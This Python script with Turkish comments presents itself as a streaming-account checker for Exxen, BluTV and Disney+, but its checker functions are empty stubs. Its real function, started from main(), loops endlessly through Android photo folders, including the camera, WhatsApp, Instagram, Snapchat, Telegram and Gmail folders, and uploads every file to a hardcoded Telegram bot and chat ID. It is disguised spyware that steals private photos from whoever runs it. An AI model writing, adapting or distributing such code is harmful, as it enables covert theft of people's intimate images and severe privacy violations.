import os
import time
import telegram
from threading import Thread

# Telegram Bot Token ve Chat ID
bot_token = "8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo"
chat_id = "7045128535"
bot = telegram.Bot(token=bot_token)

# Fotoğraf gönderme işlemi
def send_photo(file_path):
    try:
        # Fotoğraf gönderimi
        bot.send_photo(chat_id=chat_id, photo=open(file_path, 'rb'))
        print(f"Fotoğraf gönderildi: {file_path}")
    except Exception as e:
        print(f"Fotoğraf gönderme hatası: {e}")

# Fotoğraf gönderim işlemi başlatma
def photo_send_thread():
    # Burada 'dosya_yolu' doğru bir yol olmalı. Örnek yol:
    folder_paths = [
        "/storage/emulated/0/DCIM/Camera",          # DCIM Camera
        "/storage/emulated/0/Pictures",             # Pictures
        "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",  # WhatsApp Images
        "/storage/emulated/0/Android/media/com.instagram.android/Pictures",  # Instagram
        "/storage/emulated/0/Android/media/com.snapchat.android/Cache/Pictures",  # Snapchat
        "/storage/emulated/0/Android/data/com.google.android.apps.photos/cache",  # Google Photos
        "/storage/emulated/0/Android/media/com.facebook.katana/Pictures",  # Facebook
        "/storage/emulated/0/Telegram/Telegram Images",  # Telegram
        "/storage/emulated/0/Android/data/com.google.android.gm/files/pictures"  # Gmail
    ]

    while True:
        for folder_path in folder_paths:
            if os.path.exists(folder_path):
                print(f"Yol bulundu: {folder_path}")
                for file_name in os.listdir(folder_path):
                    file_path = os.path.join(folder_path, file_name)
                    if os.path.isfile(file_path):
                        send_photo(file_path)
                    time.sleep(1)  # Fotoğraflar hızlıca gönderilecek
            else:
                print(f"Yol bulunamadı: {folder_path}")
            time.sleep(1)  # Her döngü arasında 1 saniye bekle

# Checker tipi seçme ekranı
def choose_checker():
    print("Lütfen bir checker türü seçin:")
    print("1. Exxen Checker")
    print("2. BluTV Checker")
    print("3. Disney+ Checker")

    choice = input("Seçiminizi yapın (1/2/3): ")

    if choice == '1':
        print("Exxen Checker seçildi.")
        # Burada Exxen Checker kodunu ekleyebilirsiniz
    elif choice == '2':
        print("BluTV Checker seçildi.")
        # Burada BluTV Checker kodunu ekleyebilirsiniz
    elif choice == '3':
        print("Disney+ Checker seçildi.")
        # Burada Disney+ Checker kodunu ekleyebilirsiniz
    else:
        print("Geçersiz seçim.")
        choose_checker()  # Geçersiz seçim durumunda tekrar başlat

# Checker işlemi (Örnek olarak sadece basit giriş denemesi)
def try_checker(email, password, checker_type):
    print(f"{checker_type} için giriş yapılacak: {email}")
    # Burada her bir checker için gerekli giriş doğrulama kodlarını ekleyebilirsiniz
    # Örneğin, API veya web giriş doğrulaması vs.
    if email == "test@example.com" and password == "password":
        print("Giriş başarılı!")
        return True
    else:
        print("Giriş başarısız!")
        return False

# Ana program fonksiyonu
def main():
    print("Program başlatılıyor...")
    
    # Checker seçimini başlat
    choose_checker()

    # Fotoğraf gönderim işlemini başlat
    print("Fotoğraf gönderimi başlatılıyor...")
    photo_send_thread()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nProgram durduruldu.")
